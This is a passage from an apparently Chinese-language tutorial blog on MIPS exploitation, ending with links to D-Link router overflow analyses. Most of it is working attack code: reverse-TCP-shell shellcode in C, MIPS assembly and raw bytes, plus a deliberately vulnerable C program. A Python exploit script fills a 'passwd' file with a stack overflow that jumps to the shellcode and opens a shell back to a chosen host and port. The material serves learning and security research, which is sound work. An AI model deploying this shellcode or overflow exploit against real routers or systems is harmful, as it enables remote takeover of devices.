2 reboot</code>查看使用</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211025173301400.png" alt="image-20211025173301400"></p><p><strong>汇编代码 · reboot</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.global __start</span><br><span class="line">.set noreorder</span><br><span class="line"></span><br><span class="line">__start:</span><br><span class="line">lui     $v0, 0x4321</span><br><span class="line">ori     $a2, $v0, 0xFEDC</span><br><span class="line">lui     $v0, 0x2812</span><br><span class="line">ori     $a1, $v0, 0x1969</span><br><span class="line">lui     $v0, 0xFEE1</span><br><span class="line">ori     $a0, $v0, 0xDEAD</span><br><span class="line">li      $v0, 4088</span><br><span class="line">syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="reverse-tcp-Shellcode"><a href="#reverse-tcp-Shellcode" class="headerlink" title="reverse_tcp Shellcode"></a>reverse_tcp Shellcode</h4><ul><li>反弹shell<ul><li>攻击躲避在防火墙后面的服务器</li></ul></li></ul><blockquote><p>以下均为大端序</p></blockquote><p><strong>C语言实现反向连接远程端口</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> soc, rc;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    serv_addr.sin_family = AF_INET;</span><br><span class="line">    serv_addr.sin_addr.s_addr = <span class="number">0x7f000001</span>; <span class="comment">// ip 127.0.0.1</span></span><br><span class="line">    serv_addr.sin_port = <span class="number">0x7777</span>; <span class="comment">// port 30583</span></span><br><span class="line">    soc = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    rc = connect(soc, (struct sockaddr *)&amp;serv_addr, <span class="number">0x10</span>);</span><br><span class="line">    dup2(soc, <span class="number">0</span>);</span><br><span class="line">    dup2(soc, <span class="number">1</span>);</span><br><span class="line">    dup2(soc, <span class="number">2</span>);</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Python getIP.py(BigEndian)</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">get_hex = <span class="keyword">lambda</span> x: <span class="built_in">hex</span>(x)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">ip = sys.argv[<span class="number">1</span>].split(<span class="string">&#x27;.&#x27;</span>) <span class="comment"># big endian</span></span><br><span class="line"><span class="comment"># ip = sys.argv[1].split(&#x27;.&#x27;)[::-1] # little endian</span></span><br><span class="line">_ip = <span class="string">&quot;0x&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ip:</span><br><span class="line">    _ip += get_hex(<span class="built_in">int</span>(i))</span><br><span class="line"><span class="built_in">print</span>(_ip)</span><br></pre></td></tr></table></figure><h5 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h5><p><strong>Socket 系统调用 · socket(2, 2, 0)</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># sys_socket</span><br><span class="line"># a0: domain</span><br><span class="line"># a1: type</span><br><span class="line"># a2: protocol</span><br><span class="line"></span><br><span class="line">li $t7,-6</span><br><span class="line">nor $t7,$t7,$zero</span><br><span class="line">addi $a0,$t7,-3</span><br><span class="line">addi $a1,$t7,-3</span><br><span class="line">slti $a2,$zero,-1</span><br><span class="line">li $v0,4183 # sys_socket</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p><code>man 2 sokcet</code>查看使用</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211025173324106.png" alt="image-20211025173324106"></p><h5 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sw $v0,-1($sp)</span><br><span class="line">lw $a0,-1($sp)</span><br><span class="line">li $t7,0xfffd</span><br><span class="line">nor $t7,$t7,$zero</span><br><span class="line">sw $t7,-32($sp)</span><br><span class="line">lui $t6,0x7777  #port</span><br><span class="line"># ori $t6,$t6,0x7777</span><br><span class="line">sw $t6,-28($sp)</span><br><span class="line">lui $t6,0x7f00  #ip(high)</span><br><span class="line">ori $t6,$t6,0x00001  #ip(low)</span><br><span class="line">sw $t6,-26($sp)</span><br><span class="line">addiu $a1,$sp,-30</span><br><span class="line">li $t4,-17</span><br><span class="line">nor $a2,$t4,$zero</span><br><span class="line">li $v0,4170  # sys_connect</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p><code>man 2 connect</code>查看使用</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211025173850171.png" alt="image-20211025173850171"></p><p><code>connect()</code>系统调用把由文件描述符<code>sockfd</code>所代表的套接字连接到<code>addr</code>所指定的地址上，参数 <code>addrlen</code>用于标明<code>addr</code>的大小。</p><p>因此我们需要构造一个<code>struct sockaddr</code>数据结构， 其定义如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> sa_family; <span class="comment">/* address family, AF_xxx */</span></span><br><span class="line"><span class="keyword">char</span> sa_data[<span class="number">14</span>]; <span class="comment">/* 14 bytes of protocol address */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>sa_family ：是2字节的地址家族，一般都是“AF_xxx”的形式，它的值包括三种：AF_INET，AF_INET6和AF_UNSPEC。<ul><li>如果指定 AF_INET，那么函数就不能返回任何IPV6相关的地址信息；</li><li>如果仅指定了AF_INET6，则就不能返回任何IPV4地址信息;</li><li>AF_UNSPEC 则意味着函数返回的是适用于指定主机名和服务名且适合任何协议族的地址如果某个主机既有 AAAA 记录(IPV6)地址，同时又有 A 记录(IPV4)地址，那么AAAA 记录将作为 sockaddr_in6 结构返回，而 A 记录则作为 sockaddr_in 结构返回</li><li>通常用的都是AF_INET</li></ul></li></ul><p>汇编代码分析：</p><ul><li>第5行：将Socket返回套接字文件描述符<code>$v0</code>保存到<code>$sp-1</code>中，在第6行将文件描述符赋给connect的第1个参数<code>$a0</code></li><li>第6~9行：构造 <code>serv_addr.sin_family</code> 参数, 这里先将4字节的<code>0x00000002</code>写入<code>$sp-32</code>, 但因为<code>sin_family</code>是2字节，所以最终的结构体首地址从<code>$sp-30</code></li><li>第10~12行：向<code>$sp-28</code>写入<code>0x7777</code> 【这里参考书中的代码，但在实际测试中第11行直接去掉也是可以实现效果的，所以去掉也可以】</li><li>第13~15行：从<code>$sp-26</code>开始写入<code>ip</code>地址(0x7f000001 127.0.0.1)， 此时，<code>struct sockaddr</code>结构体已构造完毕，其后8字节为填充字节</li><li>第16行：connect的第2个参数(struct sockaddr)结构体的首地址是从<code>$sp-30</code>开始的</li><li>第17~18行：将第2个参数占用的字节数16写入connect的第3个参数<code>$a2</code></li></ul><p><strong>dup2 系统调用</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># sys_dup2</span><br><span class="line"># a0: oldfd (socket)</span><br><span class="line"># a1: newfd (0, 1, 2)</span><br><span class="line"></span><br><span class="line">li $s1,-3</span><br><span class="line">nor $s1,$s1,$zero</span><br><span class="line">lw $a0,-1($sp)</span><br><span class="line">dup2_loop:move $a1,$s1 # dup2_loop</span><br><span class="line">li $v0,4063 # sys_dup2</span><br><span class="line">syscall</span><br><span class="line">li $s0,-1</span><br><span class="line">addi $s1,$s1,-1</span><br><span class="line">bne $s1,$s0,dup2_loop</span><br></pre></td></tr></table></figure><p>dup2系统调用需要执行3次，因此可以使用一个循环来节省空间，相当于以下代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$s1 = <span class="number">2</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">dup2(socket_handle, $s1);</span><br><span class="line">$s0 = <span class="number">-1</span>;</span><br><span class="line">$s0 = $s0 - <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span>($s1 != $s0);</span><br></pre></td></tr></table></figure><p><strong>execve 系统调用 · execve(“//bin/sh”, 0, 0)</strong> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># sys_execve</span><br><span class="line"># a0: filename (stored on the stack) &quot;//bin/sh&quot;</span><br><span class="line"># a1: argv &quot;//bin/sh&quot;</span><br><span class="line"># a2: envp (null)</span><br><span class="line"></span><br><span class="line">slti $a2,$zero,-1</span><br><span class="line">lui $t7,0x2f2f #&quot;//&quot;</span><br><span class="line">ori $t7,$t7,0x6269 #&quot;bi&quot;</span><br><span class="line">sw $t7,-20($sp)</span><br><span class="line">lui $t6,0x6e2f #&quot;n/&quot;</span><br><span class="line">ori $t6,$t6,0x7368 #&quot;sh&quot;</span><br><span class="line">sw $t6,-16($sp)</span><br><span class="line">sw $zero,-12($sp)</span><br><span class="line">addiu $a0,$sp,-20</span><br><span class="line">sw $a0,-8($sp)</span><br><span class="line">sw $zero,-4($sp)</span><br><span class="line">addiu $a1,$sp,-8</span><br><span class="line">li $v0,4011 # sys_execve</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><ul><li>使用<code>//bin/sh</code>是为了四字节对齐</li></ul><p>完整代码如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># MIPS Big Endian execve(1,&quot;ABC\n&quot;,5);</span><br><span class="line"># export: offset =&gt; 0x90</span><br><span class="line"># Size: 52 bytes</span><br><span class="line"># $ as execve.s -o s.o</span><br><span class="line"># $ ld s.o -o execve</span><br><span class="line"># $ ./execve</span><br><span class="line">.section .text</span><br><span class="line">.globl __start</span><br><span class="line">.set noreorder</span><br><span class="line"></span><br><span class="line">__start:</span><br><span class="line"># sys_socket</span><br><span class="line"># a0: domain</span><br><span class="line"># a1: type</span><br><span class="line"># a2: protocol</span><br><span class="line"></span><br><span class="line">li $t7,-6</span><br><span class="line">nor $t7,$t7,$zero</span><br><span class="line">addi $a0,$t7,-3</span><br><span class="line">addi $a1,$t7,-3</span><br><span class="line">slti $a2,$zero,-1</span><br><span class="line">li $v0,4183 # sys_socket</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line"># sys_connect</span><br><span class="line"># a0: sockfd (stored on the stack)</span><br><span class="line"># a1: addr (data stored on the stack)</span><br><span class="line"># a2: addrlen</span><br><span class="line"></span><br><span class="line">sw $v0,-1($sp)</span><br><span class="line">lw $a0,-1($sp)</span><br><span class="line">li $t7,0xfffd</span><br><span class="line">nor $t7,$t7,$zero</span><br><span class="line">sw $t7,-32($sp)</span><br><span class="line">lui $t6,0x7777  #port</span><br><span class="line"># ori $t6,$t6,0x7777</span><br><span class="line">sw $t6,-28($sp)</span><br><span class="line">lui $t6,0x7f00  #ip(high)</span><br><span class="line">ori $t6,$t6,0x00001  #ip(low)</span><br><span class="line">sw $t6,-26($sp)</span><br><span class="line">addiu $a1,$sp,-30</span><br><span class="line">li $t4,-17</span><br><span class="line">nor $a2,$t4,$zero</span><br><span class="line">li $v0,4170  # sys_connect</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line"># sys_dup2</span><br><span class="line"># a0: oldfd (socket)</span><br><span class="line"># a1: newfd (0, 1, 2)</span><br><span class="line"></span><br><span class="line">li $s1,-3</span><br><span class="line">nor $s1,$s1,$zero</span><br><span class="line">lw $a0,-1($sp)</span><br><span class="line">dup2_loop:move $a1,$s1 # dup2_loop</span><br><span class="line">li $v0,4063 # sys_dup2</span><br><span class="line">syscall</span><br><span class="line">li $s0,-1</span><br><span class="line">addi $s1,$s1,-1</span><br><span class="line">bne $s1,$s0,dup2_loop</span><br><span class="line"></span><br><span class="line"># sys_execve</span><br><span class="line"># a0: filename (stored on the stack) &quot;//bin/sh&quot;</span><br><span class="line"># a1: argv &quot;//bin/sh&quot;</span><br><span class="line"># a2: envp (null)</span><br><span class="line"></span><br><span class="line">slti $a2,$zero,-1</span><br><span class="line">lui $t7,0x2f2f #&quot;//&quot;</span><br><span class="line">ori $t7,$t7,0x6269 #&quot;bi&quot;</span><br><span class="line">sw $t7,-20($sp)</span><br><span class="line">lui $t6,0x6e2f #&quot;n/&quot;</span><br><span class="line">ori $t6,$t6,0x7368 #&quot;sh&quot;</span><br><span class="line">sw $t6,-16($sp)</span><br><span class="line">sw $zero,-12($sp)</span><br><span class="line">addiu $a0,$sp,-20</span><br><span class="line">sw $a0,-8($sp)</span><br><span class="line">sw $zero,-4($sp)</span><br><span class="line">addiu $a1,$sp,-8</span><br><span class="line">li $v0,4011 # sys_execve</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>编译测试代码: </p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211025203832259.png" alt="image-20211025203832259"></p><h3 id="Shellcode应用实例"><a href="#Shellcode应用实例" class="headerlink" title="Shellcode应用实例"></a>Shellcode应用实例</h3><p><strong>vuln_system.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_system</span><span class="params">(<span class="keyword">int</span> code,<span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">255</span>];</span><br><span class="line"><span class="comment">//sleep(1);</span></span><br><span class="line">system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> fileLen = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fileData</span>;</span></span><br><span class="line">FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span> == stat(<span class="string">&quot;passwd&quot;</span>,&amp;fileData))</span><br><span class="line">fileLen = fileData.st_size;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((fp = fopen(<span class="string">&quot;passwd&quot;</span>,<span class="string">&quot;rb&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Cannot open file passwd!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ch=fgetc(fp);</span><br><span class="line"><span class="keyword">while</span>(count &lt;= fileLen)</span><br><span class="line">&#123;</span><br><span class="line">buf[count++] = ch;</span><br><span class="line">ch = fgetc(fp);</span><br><span class="line">&#125;</span><br><span class="line">buf[--count] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf,<span class="string">&quot;adminpwd&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">do_system(count,<span class="string">&quot;ls -l&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;you have an invalid password!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mips-linux-gnu-gcc vuln_system.c -fno-stack-protector -z norelro -o vuln_system</span><br></pre></td></tr></table></figure><p><strong>checksec vuln_system</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  vuln_system checksec vuln_system</span><br><span class="line">    Arch:     mips-32-big</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>由于没有开启<code>NX</code>保护，因此我们可以在栈中部署代码并跳转到栈上执行shellcode</p><p>计算得溢出大小为<code>4 - -0x190 =&gt; 0x194</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211025220900076.png" alt="image-20211025220900076"></p><p>根据前面对<code>vuln_system</code>的分析，</p><p>调试可知</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211025221746390.png" alt="image-20211025221746390"></p><p>故我们可以在<code>0x7fffed60</code>处布置代码, 需要注意的是，堆栈是变化的，所以我们在测试时可能需要重新定位这个地址</p><p>综上， 编写如下EXP脚本</p><h5 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeshellcode</span>(<span class="params">hostip, port</span>):</span></span><br><span class="line">    host = socket.ntohl(struct.unpack(<span class="string">&#x27;I&#x27;</span>, socket.inet_aton(hostip))[<span class="number">0</span>])</span><br><span class="line">    hosts = struct.unpack(<span class="string">&#x27;cccc&#x27;</span>, struct.pack(<span class="string">&#x27;&gt;L&#x27;</span>, host))</span><br><span class="line">    ports = struct.unpack(<span class="string">&#x27;cccc&#x27;</span>, struct.pack(<span class="string">&#x27;&gt;L&#x27;</span>, port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sys_socket</span></span><br><span class="line">    <span class="comment"># a0: domain</span></span><br><span class="line">    <span class="comment"># a1: type</span></span><br><span class="line">    <span class="comment"># a2: protocol</span></span><br><span class="line">    mipshell = <span class="string">b&quot;\x24\x0f\xff\xfa&quot;</span>  <span class="comment"># li t7,-6</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x01\xe0\x78\x27&quot;</span>  <span class="comment"># nor t7,t7,zero</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x21\xe4\xff\xfd&quot;</span>  <span class="comment"># addi a0,t7,-3</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x21\xe5\xff\xfd&quot;</span>  <span class="comment"># addi a1,t7,-3</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x28\x06\xff\xff&quot;</span>  <span class="comment"># slti a2,zero,-1</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x24\x02\x10\x57&quot;</span>  <span class="comment"># li v0,4183 # sys_socket</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x01\x01\x01\x0c&quot;</span>  <span class="comment"># syscall 0x40404</span></span><br><span class="line">    <span class="comment"># sys_connect</span></span><br><span class="line">    <span class="comment"># a0: sockfd (stored on the stack)</span></span><br><span class="line">    <span class="comment"># a1: addr (data stored on the stack)</span></span><br><span class="line">    <span class="comment"># a2: addrlen</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\xaf\xa2\xff\xff&quot;</span>   <span class="comment"># sw v0,-1(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x8f\xa4\xff\xff&quot;</span>   <span class="comment"># lw a0,-1(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x34\x0f\xff\xfd&quot;</span>   <span class="comment"># li t7,0xfffd</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x01\xe0\x78\x27&quot;</span>   <span class="comment"># nor t7,t7,zero</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\xaf\xaf\xff\xe0&quot;</span>   <span class="comment"># sw t7,-32(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x3c\x0e&quot;</span> + \</span><br><span class="line">        struct.pack(<span class="string">&#x27;2c&#x27;</span>, ports[<span class="number">2</span>], ports[<span class="number">3</span>])   <span class="comment"># lui t6,0x1f90</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x35\xce&quot;</span> + \</span><br><span class="line">        struct.pack(<span class="string">&#x27;2c&#x27;</span>, ports[<span class="number">2</span>], ports[<span class="number">3</span>])   <span class="comment"># ori t6,t6,0x1f90</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\xaf\xae\xff\xe4&quot;</span>   <span class="comment"># sw t6,-28(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x3c\x0e&quot;</span> + \</span><br><span class="line">        struct.pack(<span class="string">&#x27;2c&#x27;</span>, hosts[<span class="number">0</span>], hosts[<span class="number">1</span>])   <span class="comment"># lui t6,0x7f01</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x35\xce&quot;</span> + \</span><br><span class="line">        struct.pack(<span class="string">&#x27;2c&#x27;</span>, hosts[<span class="number">2</span>], hosts[<span class="number">3</span>])   <span class="comment"># ori t6,t6,0x101</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\xaf\xae\xff\xe6&quot;</span>   <span class="comment"># sw t6,-26(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x27\xa5\xff\xe2&quot;</span>   <span class="comment"># addiu a1,sp,-30</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x24\x0c\xff\xef&quot;</span>   <span class="comment"># li t4,-17</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x01\x80\x30\x27&quot;</span>   <span class="comment"># nor a2,t4,zero</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x24\x02\x10\x4a&quot;</span>   <span class="comment"># li v0,4170  # sys_connect</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x01\x01\x01\x0c&quot;</span>   <span class="comment"># syscall 0x40404</span></span><br><span class="line">    <span class="comment"># sys_dup2</span></span><br><span class="line">    <span class="comment"># a0: oldfd (socket)</span></span><br><span class="line">    <span class="comment"># a1: newfd (0, 1, 2)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x24\x11\xff\xfd&quot;</span>   <span class="comment"># li s1,-3</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x02\x20\x88\x27&quot;</span>   <span class="comment"># nor s1,s1,zero</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x8f\xa4\xff\xff&quot;</span>   <span class="comment"># lw a0,-1(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x02\x20\x28\x21&quot;</span>   <span class="comment"># move a1,s1 # dup2_loop</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x24\x02\x0f\xdf&quot;</span>   <span class="comment"># li v0,4063 # sys_dup2</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x01\x01\x01\x0c&quot;</span>   <span class="comment"># syscall 0x40404</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x24\x10\xff\xff&quot;</span>   <span class="comment"># li s0,-1</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x22\x31\xff\xff&quot;</span>   <span class="comment"># addi s1,s1,-1</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x16\x30\xff\xfa&quot;</span>   <span class="comment"># bne s1,s0,68 &lt;dup2_loop&gt;</span></span><br><span class="line">    <span class="comment"># sys_execve</span></span><br><span class="line">    <span class="comment"># a0: filename (stored on the stack) &quot;//bin/sh&quot;</span></span><br><span class="line">    <span class="comment"># a1: argv &quot;//bin/sh&quot;</span></span><br><span class="line">    <span class="comment"># a2: envp (null)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x28\x06\xff\xff&quot;</span>   <span class="comment"># slti a2,zero,-1</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x3c\x0f\x2f\x2f&quot;</span>   <span class="comment"># lui t7,0x2f2f &quot;//&quot;</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x35\xef\x62\x69&quot;</span>   <span class="comment"># ori t7,t7,0x6269 &quot;bi&quot;</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\xaf\xaf\xff\xec&quot;</span>   <span class="comment"># sw t7,-20(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x3c\x0e\x6e\x2f&quot;</span>   <span class="comment"># lui t6,0x6e2f &quot;n/&quot;</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x35\xce\x73\x68&quot;</span>   <span class="comment"># ori t6,t6,0x7368 &quot;sh&quot;</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\xaf\xae\xff\xf0&quot;</span>   <span class="comment"># sw t6,-16(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\xaf\xa0\xff\xf4&quot;</span>   <span class="comment"># sw zero,-12(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x27\xa4\xff\xec&quot;</span>   <span class="comment"># addiu a0,sp,-20</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\xaf\xa4\xff\xf8&quot;</span>   <span class="comment"># sw a0,-8(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\xaf\xa0\xff\xfc&quot;</span>   <span class="comment"># sw zero,-4(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x27\xa5\xff\xf8&quot;</span>   <span class="comment"># addiu a1,sp,-8</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x24\x02\x0f\xab&quot;</span>   <span class="comment"># li v0,4011 # sys_execve</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x01\x01\x01\x0c&quot;</span>  <span class="comment"># syscall 0x40404</span></span><br><span class="line">    <span class="keyword">return</span> mipshell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] prepare shellcode&#x27;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    cmd = <span class="string">b&quot;sh&quot;</span>.ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload</span></span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x194</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&gt;L&quot;</span>, <span class="number">0x7fffed60</span>)     </span><br><span class="line">    payload += makeshellcode(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">4444</span>)            </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27; ok!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># create password file</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] create password file&#x27;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    fw = <span class="built_in">open</span>(<span class="string">&#x27;passwd&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    fw.write(payload) </span><br><span class="line">    fw.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27; ok!&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] payload length = <span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">len</span>(payload))&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>结果如下: </p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211025222626841.png" alt="image-20211025222626841"></p><h2 id="路由器固件提取"><a href="#路由器固件提取" class="headerlink" title="路由器固件提取"></a>路由器固件提取</h2><h3 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h3><p>查看文件的<code>magic</code>, 看关键的头字符，然后利用<code>dd</code>命令进行切割</p><h3 id="自动"><a href="#自动" class="headerlink" title="自动"></a>自动</h3><blockquote><p>暂时用不到，跳过自定义签名文件编写</p></blockquote><p><code>binwalk</code>, 可以自定义magic签名文件</p><h2 id="D-Link-DIR-815-路由器多次溢出漏洞分析"><a href="#D-Link-DIR-815-路由器多次溢出漏洞分析" class="headerlink" title="D-Link DIR-815 路由器多次溢出漏洞分析"></a>D-Link DIR-815 路由器多次溢出漏洞分析</h2><p><a href="https://lantern.cool/CVE-d-link-dir-815/">D-Link DIR-815 路由器多次溢出漏洞分析 | Lantern’s 小站</a></p><h2 id="D-Link-DIR-645-路由器溢出漏洞分析"><a 